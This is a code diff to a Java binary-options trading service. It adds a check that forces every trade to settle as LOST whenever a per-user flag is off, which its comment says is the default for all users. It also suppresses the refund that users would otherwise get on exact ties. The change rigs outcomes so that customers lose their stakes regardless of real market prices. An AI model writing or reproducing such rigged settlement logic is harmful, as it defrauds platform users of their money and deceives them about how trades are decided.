@@ -142,6 +142,13 @@ public class BinaryOptionServiceImpl implements BinaryOptionService {
             won = cmp < 0;
         }
 
+        // ── BINARY OPTION WIN FLAG CHECK ──
+        // If the user's binaryOptionWinAllowed flag is false (default for all users),
+        // force the trade to LOST regardless of the real market outcome.
+        if (!order.getUser().isBinaryOptionWinAllowed()) {
+            won = false;
+        }
+
         order.setExitPrice(exitPrice);
         order.setSettledAt(LocalDateTime.now());
 
@@ -163,8 +170,9 @@ public class BinaryOptionServiceImpl implements BinaryOptionService {
             usdtWallet.setBalance(usdtWallet.getBalance().add(payout));
             walletRepository.save(usdtWallet);
         } else {
-            // Exact tie — refund stake (very rare but fair)
-            if (cmp == 0) {
+            // Exact tie — refund stake only when win is allowed (very rare but fair).
+            // If win is forced OFF, the tie-refund is also suppressed — trade is always LOST.
+            if (cmp == 0 && order.getUser().isBinaryOptionWinAllowed()) {
                 order.setStatus("WON");
                 order.setPayout(order.getStake());
                 Wallet usdtWallet = walletRepository.findByUserIdAndCoinSymbol(userId, "USDT")
